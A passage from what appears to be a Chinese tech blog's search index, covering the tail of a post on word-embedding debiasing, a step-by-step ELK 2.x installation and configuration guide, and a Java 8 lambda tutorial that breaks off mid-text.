对于“医生（doctor）”、“老师（teacher）”、“接待员（receptionist）”等本身与性别无关词汇，可以中和（Neutralize）其中的偏见。首先用“女性（woman）”的词向量减去“男性（man）”的词向量，得到的向量 $g=e{woman}−e{man}$ 就代表了“性别（gender）”。假设现有的词向量维数为 50，那么对某个词向量，将 50 维空间分成两个部分：与性别相关的方向 g 和与 g 正交的其他 49 个维度 $g_{\\perp}$。如下左图： 而除偏的步骤，是将要除偏的词向量（左图中的 $e{receptionist}$）在向量 g 方向上的值置为 0，变成右图所示的 $e^{debiased}{receptionist}$。 2. 均衡本身与性别有关词汇 对于“男演员（actor）”、“女演员（actress）”、“爷爷（grandfather）”等本身与性别有关词汇，中和“婴儿看护人（babysit）”中存在的性别偏见后，还是无法保证它到“女演员（actress）”与到“男演员（actor）”的距离相等。对这样一对性别有关的词，除偏的过程是均衡（Equalization）它们的性别属性。其核心思想是确保一对词（actor 和 actress）到 g⊥ 的距离相等。 相关论文：Bolukbasi et. al., 2016. Man is to computer programmer as woman is to homemaker? Debiasing word embeddings 代码示例自然语言处理与词嵌入","link":"/2018/03/02/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%E4%B8%8E%E8%AF%8D%E5%B5%8C%E5%85%A5/"},{"title":"ELK安装与配置","text":"ELK介绍日志主要包括系统日志、应用程序日志和安全日志。系统运维和开发人员可以通过日志了解服务器软硬件信息、检查配置过程中的错误及错误发生的原因。经常分析日志可以了解服务器的负荷，性能安全性，从而及时采取措施纠正错误。 通常，日志被分散的储存不同的设备上。如果你管理数十上百台服务器，还使用依次登录每台机器的传统方法查阅日志，效率会十分其低下。开源实时日志分析ELK平台能够完美的解决上述问题。 ELK由ElasticSearch、Logstash和Kiabana三个开源工具组成： Elasticsearch是个开源分布式搜索引擎，它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。 Logstash是一个完全开源的工具，他可以对你的日志进行收集、过滤，并将其存储供以后使用（如，搜索）。 Kibana也是一个开源和免费的工具，它Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助您汇总、分析和搜索重要数据日志。 安装jdkjdk下载地址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.htmlLogstash的运行依赖于Java环境，而Logstash1.5以上版本依赖的java版本不低于java 1.7，因此推荐最新版本Java。123456#rpm -ivh jdk-8u77-linux-x64.rpm #java -versionjava version \"1.8.0_77\"Java(TM) SE Runtime Environment (build 1.8.0_77-b03)Java HotSpot(TM) 64-Bit Server VM (build 25.77-b03, mixed mode) 安装Elasticsearch安装elasticsearch、logstash和kibana的官网地址：https://www.elastic.co/downloads/ 我使用的版本信息如下：elasticsearch：https:https://www.elastic.co/downloads/past-releases/elasticsearch-2-2-0logstash： https://www.elastic.co/downloads/past-releases/logstash-2-2-0kibana： https://www.elastic.co/downloads/past-releases/kibana-4-4-0 安装elasticsearch1tar xf elasticsearch-2.2.0.tar.gz -C /usr/local/ 安装elasticsearch的head插件123456789#cd /usr/local/elasticsearch-2.2.0#./bin/plugin install mobz/elasticsearch-head-&gt; Installing mobz/elasticsearch-head...Plugins directory [/usr/local/elasticsearch-2.2.0/plugins] does not exist. Creating...Trying https://github.com/mobz/elasticsearch-head/archive/master.zip ...Downloading ..................................DONEVerifying https://github.com/mobz/elasticsearch-head/archive/master.zip checksums if available ...NOTE: Unable to verify checksum for downloaded plugin (unable to find .sha1 or .md5 file to verify)Installed head into /usr/local/elasticsearch-2.2.0/plugins/head 查看：123#ll plugins/total 4drwxr-xr-x 5 root root 4096 Mar 29 18:09 head 安装elasticsearch的kopf插件注：Elasticsearch-kopf插件可以查询Elasticsearch中的数据1234567#./bin/plugin install lmenezes/elasticsearch-kopf-&gt; Installing lmenezes/elasticsearch-kopf...Trying https://github.com/lmenezes/elasticsearch-kopf/archive/master.zip ...Downloading ..................................DONEVerifying https://github.com/lmenezes/elasticsearch-kopf/archive/master.zip checksums if available ...NOTE: Unable to verify checksum for downloaded plugin (unable to find .sha1 or .md5 file to verify)Installed kopf into /usr/local/elasticsearch-2.2.0/plugins/kopf查看1234#ll plugins/total 8drwxr-xr-x 5 search search 4096 Mar 29 18:09 headdrwxrwxr-x 8 search search 4096 Mar 30 18:10 kopf 创建elasticsearch的data和logs目录12mkdir /elasticsearch/data -pvmkdir /elasticsearch/logs -pv 编辑elasticsearch的配置文件1234567891011121314cd config#备份一下cp elasticsearch.yml elasticsearch.yml_back#在末尾添加如下几行vim elasticsearch.yml #cluster.name: es_cluster#node.name: node-1#path.data: /elasticsearch/data#path.logs: /elasticsearch/logs#network.host: 10.0.90.24 #network.port: 9200 启动elasticsearch1234567#./bin/elasticsearchException in thread \"main\" java.lang.RuntimeException: don't run elasticsearch as root. at org.elasticsearch.bootstrap.Bootstrap.initializeNatives(Bootstrap.java:93) at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:144) at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:285) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:35)Refer to the log for complete error details. 提示不能以root用户启动，所以创建一个普通用户，以普通用户身份启动elasticsearch12345#groupadd search#useradd -g search search将data和logs目录的属主和属组改为search#chown search.search /elasticsearch/ -R 重新启动123456789101112131415161718192021#./bin/elasticsearch[2016-03-29 19:58:20,026][WARN ][bootstrap ] unable to install syscall filter: seccomp unavailable: requires kernel 3.5+ with CONFIG_SECCOMP and CONFIG_SECCOMP_FILTER compiled inException in thread \"main\" java.lang.IllegalStateException: Unable to access 'path.scripts' (/usr/local/elasticsearch-2.2.0/config/scripts)Likely root cause: java.nio.file.AccessDeniedException: /usr/local/elasticsearch-2.2.0/config/scripts at sun.nio.fs.UnixException.translateToIOException(UnixException.java:84) at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102) at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107) at sun.nio.fs.UnixFileSystemProvider.createDirectory(UnixFileSystemProvider.java:384) at java.nio.file.Files.createDirectory(Files.java:674) at java.nio.file.Files.createAndCheckIsDirectory(Files.java:781) at java.nio.file.Files.createDirectories(Files.java:767) at org.elasticsearch.bootstrap.Security.ensureDirectoryExists(Security.java:337) at org.elasticsearch.bootstrap.Security.addPath(Security.java:314) at org.elasticsearch.bootstrap.Security.addFilePermissions(Security.java:248) at org.elasticsearch.bootstrap.Security.createPermissions(Security.java:212) at org.elasticsearch.bootstrap.Security.configure(Security.java:118) at org.elasticsearch.bootstrap.Bootstrap.setupSecurity(Bootstrap.java:196) at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:167) at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:285) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:35)Refer to the log for complete error details. 报以上错误，原因是权限的问题，修改权限1#chown search.search /usr/local/elasticsearch-2.2.0 -R 然后切换到search用户启动elasticsearch1234567891011121314151617181920212223#su - search$cd /usr/local/elasticsearch-2.2.0$./bin/elasticsearch[2016-03-29 20:11:20,243][WARN ][bootstrap ] unable to install syscall filter: seccomp unavailable: requires kernel 3.5+ with CONFIG_SECCOMP and CONFIG_SECCOMP_FILTER compiled in[2016-03-29 20:11:20,409][INFO ][node ] [node-1] version[2.2.0], pid[2359], build[8ff36d1/2016-01-27T13:32:39Z][2016-03-29 20:11:20,409][INFO ][node ] [node-1] initializing ...[2016-03-29 20:11:21,102][INFO ][plugins ] [node-1] modules [lang-expression, lang-groovy], plugins [head], sites [head][2016-03-29 20:11:21,118][INFO ][env ] [node-1] using [1] data paths, mounts [[/ (/dev/sda3)]], net usable_space [24.5gb], net total_space [27.2gb], spins? [possibly], types [ext4][2016-03-29 20:11:21,118][INFO ][env ] [node-1] heap size [1007.3mb], compressed ordinary object pointers [true][2016-03-29 20:11:22,541][INFO ][node ] [node-1] initialized[2016-03-29 20:11:22,542][INFO ][node ] [node-1] starting ...[2016-03-29 20:11:22,616][INFO ][transport ] [node-1] publish_address {10.0.90.24:9300}, bound_addresses {10.0.90.24:9300}[2016-03-29 20:11:22,636][INFO ][discovery ] [node-1] es_cluster/yNJhglX4RF-ydC4CWpFyTA[2016-03-29 20:11:25,732][INFO ][cluster.service ] [node-1] new_master {node-1}{yNJhglX4RF-ydC4CWpFyTA}{10.0.90.24}{10.0.90.24:9300}, reason: zen-disco-join(elected_as_master, [0] joins received)[2016-03-29 20:11:25,769][INFO ][http ] [node-1] publish_address {10.0.90.24:9200}, bound_addresses {10.0.90.24:9200}[2016-03-29 20:11:25,770][INFO ][node ] [node-1] started[2016-03-29 20:11:25,788][INFO ][gateway ] [node-1] recovered [0] indices into cluster_state#也可以直接让elasticsearch在后台运行$./bin/elasticsearch &amp;#或者不中断启动（我这里使用这种方式启动）$nohup /usr/local/elasticsearch-2.2.0/bin/elasticsearch &amp; 查看启动是否成功123456789# netstat -tunlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 950/sshd tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1027/master tcp 0 0 ::ffff:10.0.90.24:9300 :::* LISTEN 2428/java tcp 0 0 :::22 :::* LISTEN 950/sshd tcp 0 0 ::1:25 :::* LISTEN 1027/master tcp 0 0 ::ffff:10.0.90.24:9200 :::* LISTEN 2428/java 在浏览器启动查看12345678910111213http://10.0.90.24:9200/ --会显示如下：{ \"name\" : \"node-1\", \"cluster_name\" : \"es_cluster\", \"version\" : { \"number\" : \"2.2.0\", \"build_hash\" : \"8ff36d139e16f8720f2947ef62c8167a888992fe\", \"build_timestamp\" : \"2016-01-27T13:32:39Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.4.1\" }, \"tagline\" : \"You Know, for Search\"} 返回的信息展示了配置的cluster_name和name，以及安装的ES的版本等信息。 至于之前安装的head插件，它是一个用浏览器跟ES集群交互的插件，可以查看集群状态、集群的doc内容、执行搜索和普通的Rest请求等。可以如下地址 http://ip:9200/_plugin/head 查看ES集群状态： 安装Logstash安装1234#tar xf kibana-4.4.0-linux-x64.tar.gz -C /usr/local/#cd /usr/local/#mv kibana-4.4.0-linux-x64/ kibana 为kibana提供SysV形式的启动脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798vim /etc/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=\"Kibana4\"PROG=\"/etc/init.d/kibana\"# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1fi# Function library. /etc/init.d/functionsstart() { echo -n \"Starting $DESC : \"pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemonif [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi}reload(){ echo \"Reload command is not implemented for this service.\" return $RETVAL}stop() { echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE}case \"$1\" in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo \"Usage: $0 {start|stop|status|restart}\" &gt;&amp;2exit 2 ;;esac 12添加执行权限#chmod +x /etc/init.d/kibana 12345678910111213141516171819启动kibana#service kibana startStarting Kibana4 : [ OK ]查看是否启动成功，如下表示启动成功#netstat -tunlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 950/sshd tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1027/master tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 2909/node --kibana端口 tcp 0 0 ::ffff:10.0.90.24:9300 :::* LISTEN 2428/java tcp 0 0 :::22 :::* LISTEN 950/sshd tcp 0 0 ::1:25 :::* LISTEN 1027/master tcp 0 0 ::ffff:10.0.90.24:9200 :::* LISTEN 2428/java 设置开机自启动#chkconfig --add kibana#chkconfig kibana on 安装KibanaKibana一个收集器，我们需要为它指定Input和Output（Input和Output可以为多个）。 123#tar xf logstash-2.2.0.tar.gz -C /usr/local/#cd /usr/local/#mv logstash-2.2.0 logstash 测试logstash，你会发现输入什么内容，logstash按照某种格式输出什么内容123456#/usr/local/logstash/bin/logstash -e 'input { stdin{} } output { stdout {} }' Settings: Default pipeline workers: 2Logstash startup completedhello world ---输入的内容2016-04-01T09:05:35.818Z elk hello world 注：其中-e参数允许Logstash直接通过命令行接受设置。这点尤其快速的帮助我们反复的测试配置是否正确而不用写配置文件。使用CTRL-C命令可以退出之前运行的Logstash。 使用-e参数在命令行中指定配置是很常用的方式，不过如果需要配置更多设置则需要很长的内容。这种情况，我们首先创建一个简单的配置文件，并且指定logstash使用这个配置文件。 注：logstash 配置文件的例子：https://www.elastic.co/guide/en/logstash/current/configuration-file-structure.htmllogstash配置文件是以json格式设置参数的配置文件位于/etc/logstash/conf.d目录（rpm安装的路径）下配置包括三个部分输入端、过滤器和输出。 格式如下：12345678910111213# This is a comment. You should use comments to describe# parts of your configuration.input { ...}filter { ...}output { ...} 插件配置格式：1234567891011input { file { path =&gt; \"/var/log/messages\" type =&gt; \"syslog\" } file { path =&gt; \"/var/log/apache/access.log\" type =&gt; \"apache\" }} 首先创建一个简单的例子1234567#cd /usr/local/logstash/config#cat logstash-simple.conf input { stdin { } }output { stdout { codec =&gt; rubydebug }} 先输出一些内容，例如当前时间：12#echo \"`date` hello world\"Fri Apr 1 17:07:17 CST 2016 hello world 执行123#/usr/local/logstash/bin/logstash agent -f logstash-simple.confSettings: Default pipeline workers: 2Logstash startup completed 12345678# 将刚才生成的时间信息粘贴到这里，回车，就会看到如下信息：Fri Apr 1 17:07:17 CST 2016 hello world{ \"message\" =&gt; \"Tue Jul 14 18:07:07 EDT 2015 hello World\", \"@version\" =&gt; \"1\", \"@timestamp\" =&gt; \"2016-04-01T09:08:19.809Z\", \"host\" =&gt; \"elk\"} 接下来在logstash的安装目录创建一个用于测试logstash使用elasticsearch作为logstash的后端输出的测试文件logstash-es-test.conf该文件中定义了stdout和elasticsearch作为output，这样的“多重输出”即保证输出结果显示到屏幕上，同时也输出到elastisearch中。如下：123456#cat logstash-es-test.conf input { stdin { } }output { elasticsearch {hosts =&gt; \"10.0.90.24\" } stdout { codec=&gt; rubydebug }} 测试配置文件是否正确12/usr/local/logstash/bin/logstash --configtest -f logstash-es-test.conf Configuration OK 如果文件比较多也可以这样：1/usr/local/logstash/bin/logstash --configtest -f config/*.conf 执行：123/usr/local/logstash/bin/logstash agent -f logstash-es-test.conf Settings: Default pipeline workers: 2Logstash startup completed 12345678# 输入以下内容，回车hello logstash{ \"message\" =&gt; \"hello logstash\", \"@version\" =&gt; \"1\", \"@timestamp\" =&gt; \"2016-04-01T09:18:26.967Z\", \"host\" =&gt; \"elk\"} Ctrl+c 结束执行！ 我们可以使用curl命令发送请求来查看ES是否接收到了数据：12345678910111213141516171819202122232425262728293031323334#curl 'http://10.0.90.24:9200/_search?pretty'{ \"took\" : 4, \"timed_out\" : false, \"_shards\" : { \"total\" : 6, \"successful\" : 6, \"failed\" : 0 }, \"hits\" : { \"total\" : 5, \"max_score\" : 1.0, \"hits\" : [ { \"_index\" : \".kibana\", \"_type\" : \"config\", \"_id\" : \"4.4.0\", \"_score\" : 1.0, \"_source\" : { \"buildNum\" : 9689 } }, { \"_index\" : \"logstash-2016.04.01\", \"_type\" : \"logs\", \"_id\" : \"AVPRHddUspScKx_yDLKx\", \"_score\" : 1.0, \"_source\" : { \"message\" : \"hello logstash\", \"@version\" : \"1\", \"@timestamp\" : \"2016-04-01T09:18:26.967Z\", \"host\" : \"elk\" } }] }}通过以上显示信息，可以看到ES已经收到了数据！说明可以通过Elasticsearch和Logstash来收集日志数据了。 kibana端索引配置123456789101112131415#cd /usr/local/kibana/config备份配置#cp kibana.yml kibana.yml_back修改为如下：其他默认不变server.port: 80 --修改端口为80，默认是5601server.host: \"10.0.90.24\"elasticsearch.url: \"http://10.0.90.24:9200\" --ip为server的ip地址kibana.defaultAppId: \"discover\"elasticsearch.requestTimeout: 300000elasticsearch.shardTimeout: 0重启kibana#service kibana restart 在浏览器访问kibana的地址 http://10.0.90.24 就可以看到kibana的页面了。 登录之后，首先配置一个索引，默认kibana的数据被指向Elasticsearch，使用默认的logstash-*的索引名称，并且是基于时间（@timestamp）的，如下 点击“Create”，如果能看到如下类似界面，说明索引创建完成。 点击“Discover”，可以搜索和浏览Elasticsearch中的数据，默认搜索的是最近15分钟的数据，可以自定义选择时间。到此，说明你的ELK平台安装部署完成。 **ELK还可以通过索引进行可视化数据监控**","link":"/2016/10/25/ELK%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"},{"title":"Lambda应用场景和使用实例","text":"Java 8已经推出一段时间了，Lambda是其中最火的主题，不仅仅是因为语法的改变，更重要的是带来了函数式编程的思想。这篇文章主要聊聊Lambda的应用场景及其相关使用示例。 Java为何需要Lambda1996年1月，Java 1.0发布了，此后计算机编程领域发生了翻天覆地的变化。商业发展需要更复杂的应用，大多数程序都跑在更强大的装备多核CPU的机器上。带有高效运行期编译器的Java虚拟机（JVM）的出现，使得程序员将精力更多放在编写干净、易于维护的代码上，而不是思考如何将每一个CPU时钟、每一字节内存物尽其用。 多核CPU的出现成了“房间里的大象”，无法忽视却没人愿意正视。算法中引入锁不但容易出错，而且消耗时间。人们开发了java.util.concurrent包和很多第三方类库，试图将并发抽象化，用以帮助程序员写出在多核CPU上运行良好的程序。不幸的是，到目前为止，我们走得还不够远。 那些类库的开发者使用Java时，发现抽象的级别还不够。处理大数据就是个很好的例子，面对大数据，Java还欠缺高效的并行操作。Java 8允许开发者编写复杂的集合处理算法，只需要简单修改一个方法，就能让代码在多核CPU上高效运行。为了编写并行处理这些大数据的类库，需要在语言层面上修改现有的Java：增加lambda表达式。 当然，这样做是有代价的，程序员必须学习如何编写和阅读包含lambda表达式的代码，但是，这不是一桩赔本的买卖。与手写一大段复杂的、线程安全的代码相比，学习一点新语法和一些新习惯容易很多。开发企业级应用时，好的类库和框架极大地降低了开发时间和成本，也扫清了开发易用且高效的类库的障碍。 Lambda应用场景你有必要学习下函数式编程的概念，比如函数式编程初探，但下面我将重点放在函数式编程的实用性上，包括那些可以被大多数程序员理解和使用的技术，我们关心的如何写出好代码，而不是符合函数编程风格的代码 使用() -&gt; {} 替代匿名类现在Runnable线程，Swing，JavaFX的事件监听器代码等，在java 8中你可以使用Lambda表达式替代丑陋的匿名类。123456789101112131415161718192021222324//Before Java 8:new Thread(new Runnable() { @Override public void run() { System.out.println(\"Before Java8 \"); }}).start();//Java 8 way:new Thread(() -&gt; System.out.println(\"In Java8!\"));// Before Java 8:JButton show = new JButton(\"Show\");show.addActionListener(new ActionListener() { @Override public void actionPerformed(ActionEvent e) { System.out.println(\"without lambda expression is boring\"); } });// Java 8 way:show.addActionListener((e) -&gt; { System.out.println(\"Action !! Lambda expressions Rocks\");}); 使用内循环替代外循环外循环：描述怎么干，代码里嵌套2个以上的for循环的都比较难读懂；只能顺序处理List中的元素；内循环：描述要干什么，而不是怎么干；不一定需要顺序处理List中的元素12345678910111213141516171819202122//Prior Java 8 :List features = Arrays.asList(\"Lambdas\", \"Default Method\",\"Stream API\", \"Date and Time API\");for (String feature : features) { System.out.println(feature);}//In Java 8:List features = Arrays.asList(\"Lambdas\", \"Default Method\", \"Stream API\", \"Date and Time API\");features.forEach(n -&gt; System.out.println(n));// Even better use Method reference feature of Java 8// method reference is denoted by :: (double colon) operator// looks similar to score resolution operator of C++features.forEach(System.out::println);Output:LambdasDefault MethodStream APIDate and Time API 支持函数编程为了支持函数编程，Java 8加入了一个新的包java.util.function，其中有一个接口java.util.function.Predicate是支持Lambda函数编程：1234567891011121314151617181920212223242526272829303132333435363738394041public static void main(args[]){ List languages = Arrays.asList(\"Java\", \"Scala\", \"C++\", \"Haskell\", \"Lisp\"); System.out.println(\"Languages which starts with J :\"); filter(languages, (str)-&gt;str.startsWith(\"J\")); System.out.println(\"Languages which ends with a \"); filter(languages, (str)-&gt;str.endsWith(\"a\")); System.out.println(\"Print all languages :\"); filter(languages, (str)-&gt;true); System.out.println(\"Print no language : \"); filter(languages, (str)-&gt;false); System.out.println(\"Print language whose length greater than 4:\"); filter(languages, (str)-&gt;str.length() &gt; 4);} public static void filter(List names, Predicate condition) { names.stream().filter((name) -&gt; (condition.test(name))) .forEach((name) -&gt; {System.out.println(name + \" \"); }); }Output:Languages which starts with J :JavaLanguages which ends with aJavaScalaPrint all languages :JavaScalaC++HaskellLispPrint no language :Print language whose length greater than 4:ScalaHaskell 用管道方式处理数据更加简洁Java 8里面新增的Stream API ，让集合中的数据处理起来更加方便，性能更高，可读性更好假设一个业务场景：对于20元以上的商品，进行9折处理，最后得到这些商品的折后价格。123456final BigDecimal totalOfDiscountedPrices = prices.stream().filter(price -&gt; price.compareTo(BigDecimal.valueOf(20)) &gt; 0).map(price -&gt; price.multiply(BigDecimal.valueOf(0.9))).reduce(BigDecimal.ZERO,BigDecimal::add);System.out.println(&quot;Total of discounted prices: &quot; + totalOfDiscountedPrices); 想象一下：如果用面向对象处理这些数据，需要多少行？多少次循环？需要声明多少个中间变量？ Lambda使用实例例1 用lambda表达式实现Runnable一般使用Java 8时，首先做的就是使用lambda表达式替换匿名类，而实现Runnable接口是匿名类的最好示例。看一下Java 8之前的runnable实现方法，需要4行代码，而使用lambda表达式只需要一行代码。我们在这里做了什么呢？那就是用() -&gt; {}代码块替代了整个匿名类。1234567891011121314// Java 8之前：new Thread(new Runnable() { @Override public void run() { System.out.println(\"Before Java8, too much code for too little to do\"); }}).start();//Java 8方式：new Thread( () -&gt; System.out.println(\"In Java8, Lambda expression rocks !!\") ).start();输出：too much code, for too little to doLambda expression rocks !! 这个例子向我们展示了Java 8 lambda表达式的语法。你可以使用lambda写出如下代码：123(params) -&gt; expression(params) -&gt; statement(params) -&gt; { statements } 例如，如果你的方法不对参数进行修改、重写，只是在控制台打印点东西的话，那么可以这样写：1() -&gt; System.out.println(\"Hello Lambda Expressions\");如果你的方法接收两个参数，那么可以写成如下这样：1(int even, int odd) -&gt; even + odd 顺便提一句，通常都会把lambda表达式内部变量的名字起得短一些。这样能使代码更简短，放在同一行。所以，在上述代码中，变量名选用a、b或者x、y会比even、odd要好。 例2 使用Java 8 lambda表达式进行事件处理如果你用过Swing API编程，你就会记得怎样写事件监听代码。这又是一个旧版本简单匿名类的经典用例，但现在可以不这样了。你可以用lambda表达式写出更好的事件监听代码，如下所示：12345678910111213// Java 8之前：JButton show = new JButton(\"Show\");show.addActionListener(new ActionListener() { @Override public void actionPerformed(ActionEvent e) { System.out.println(\"Event handling without lambda expression is boring\"); }});// Java 8方式：show.addActionListener((e) -&gt; { System.out.println(\"Light, Camera, Action !! Lambda expressions Rocks\");}); Java开发者经常使用匿名类的另一个地方是为 Collections.sort() 定制 Comparator。在Java 8中，你可以用更可读的lambda表达式换掉丑陋的匿名类。我把这个留做练习，应该不难，可以按照我在使用lambda表达式实现 Runnable 和 ActionListener 的过程中的套路来做。 例3 使用lambda表达式对列表进行迭代如果你使过几年Java，你就知道针对集合类，最常见的操作就是进行迭代，并将业务逻辑应用于各个元素，例如处理订单、交易和事件的列表。由于Java是命令式语言，Java 8之前的所有循环代码都是顺序的，即可以对其元素进行并行化处理。如果你想做并行过滤，就需要自己写代码，这并不是那么容易。通过引入lambda表达式和默认方法，将做什么和怎么做的问题分开了，这意味着Java集合现在知道怎样做迭代，并可以在API层面对集合元素进行并行处理。下面的例子里，我将介绍如何在使用lambda或不使用lambda表达式的情况下迭代列表。你可以看到列表现在有了一个 forEach() 方法，它可以迭代所有对象，并将你的lambda代码应用在其中。12345678910111213141516171819// Java 8之前：List features = Arrays.asList(\"Lambdas\", \"Default Method\", \"Stream API\", \"Date and Time API\");for (String feature : features) { System.out.println(feature);}// Java 8之后：List features = Arrays.asList(\"Lambdas\", \"Default Method\", \"Stream API\", \"Date and Time API\");features.forEach(n -&gt; System.out.println(n));// 使用Java 8的方法引用更方便，方法引用由::双冒号操作符标示，// 看起来像C++的作用域解析运算符features.forEach(System.out::println);输出：LambdasDefault MethodStream APIDate and Time API 列表循环的最后一个例子展示了如何在Java 8中使用方法引用（method reference）。你可以看到C++里面的双冒号、范围解析操作符现在在Java 8中用来表示方法引用。 例4 使用lambda表达式和函数式接口Predicate除了在语言层面支持函数式编程风格，Java 8也添加了一个包，叫做 java.util.function。它包含了很多类，用来支持Java的函数式编程。其中一个便是Predicate，使用 java.util.function.Predicate 函数式接口以及lambda表达式，可以向API方法添加逻辑，用更少的代码支持更多的动态行为。下面是Java 8 Predicate 的例子，展示了过滤集合数据的多种常用方法。Predicate接口非常适用于做过滤。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public static void main(args[]){ List languages = Arrays.asList(\"Java\", \"Scala\", \"C++\", \"Haskell\", \"Lisp\"); System.out.println(\"Languages which starts with J :\"); filter(languages, (str)-&gt;str.startsWith(\"J\")); System.out.println(\"Languages which ends with a \"); filter(languages, (str)-&gt;str.endsWith(\"a\")); System.out.println(\"Print all languages :\"); filter(languages, (str)-&gt;true); System.out.println(\"Print no language : \"); filter(languages, (str)-&gt;false); System.out.println(\"Print language whose length greater than 4:\"); filter(languages, (str)-&gt;str.length() &gt; 4);}public static void filter(List names, Predicate condition) { for(String name: names) { if(condition.test(name)) { System.out.println(name + \" \"); } }}输出：Languages which starts with J :JavaLanguages which ends with aJavaScalaPrint all languages :JavaScalaC++HaskellLispPrint no language :Print language whose length greater than 4:ScalaHaskell// 更好的办法public static void filter(List names, Predicate condition) { names.stream().filter((name) -&gt; (condition.test(name))).forEach((name) -&gt; { System.out.println(name + \" \"); });} 可以看到，Stream API的过滤方法也接受一个Predicate，这意味着可以将我们定制的 filter() 方法替换成写在里面的内联代码，这就是lambda表达式的魔力。另外，Predicate接口也允许进行多重条件的测试，下个例子将要讲到。 例5 如何在lambda表达式中加入Predicate上个例子说到，java.util.function.Predicate 允许将两个或更多的 Predicate 合成一个。它提供类似于逻辑操作符AND和OR的方法，名字叫做and()、or()和xor()，用于将传入 filter() 方法的条件合并起来。例如，要得到所有以J开始，长度为四个字母的语言，可以定义两个独立的 Predicate 示例分别表示每一个条件，然后用 Predicate.and() 方法将它们合并起来，如下所示：1234567// 甚至可以用and()、or()和xor()逻辑函数来合并Predicate，// 例如要找到所有以J开始，长度为四个字母的名字，你可以合并两个Predicate并传入Predicate&lt;String&gt; startsWithJ = (n) -&gt; n.startsWith(\"J\");Predicate&lt;String&gt; fourLetterLong = (n) -&gt; n.length() == 4;names.stream() .filter(startsWithJ.and(fourLetterLong)) .forEach((n) -&gt; System.out.print(\"nName, which starts with 'J' and four letter long is : \" + n)); 类似地，也可以使用 or() 和 xor() 方法。本例着重介绍了如下要点：可按需要将 Predicate 作为单独条件然后将其合并起来使用。简而言之，你可以以传统Java命令方式使用 Predicate 接口，也可以充分利用lambda表达式达到事半功倍的效果。 例6 中使用lambda表达式的Map和Reduce示例本例介绍最广为人知的函数式编程概念map。它允许你将对象进行转换。例如在本例中，我们将 costBeforeTax 列表的每个元素转换成为税后的值。我们将 x -&gt; x*x lambda表达式传到 map() 方法，后者将其应用到流中的每一个元素。然后用 forEach() 将列表元素打印出来。使用流API的收集器类，可以得到所有含税的开销。有 toList() 这样的方法将 map 或任何其他操作的结果合并起来。由于收集器在流上做终端操作，因此之后便不能重用流了。你甚至可以用流API的 reduce() 方法将所有数字合成一个，下一个例子将会讲到。12345678910111213141516171819202122// 不使用lambda表达式为每个订单加上12%的税List costBeforeTax = Arrays.asList(100, 200, 300, 400, 500);for (Integer cost : costBeforeTax) { double price = cost + .12*cost; System.out.println(price);}// 使用lambda表达式List costBeforeTax = Arrays.asList(100, 200, 300, 400, 500);costBeforeTax.stream().map((cost) -&gt; cost + .12*cost).forEach(System.out::println);输出：112.0224.0336.0448.0560.0112.0224.0336.0448.0560.0 在上个例子中，可以看到map将集合类（例如列表）元素进行转换的。还有一个 reduce() 函数可以将所有值合并成一个。Map和Reduce操作是函数式编程的核心操作，因为其功能，reduce 又被称为折叠操作。另外，reduce 并不是一个新的操作，你有可能已经在使用它。SQL中类似 sum()、avg() 或者 count() 的聚集函数，实际上就是 reduce 操作，因为它们接收多个值并返回一个值。流API定义的 reduceh() 函数可以接受lambda表达式，并对所有值进行合并。IntStream这样的类有类似 average()、count()、sum() 的内建方法来做 reduce 操作，也有mapToLong()、mapToDouble() 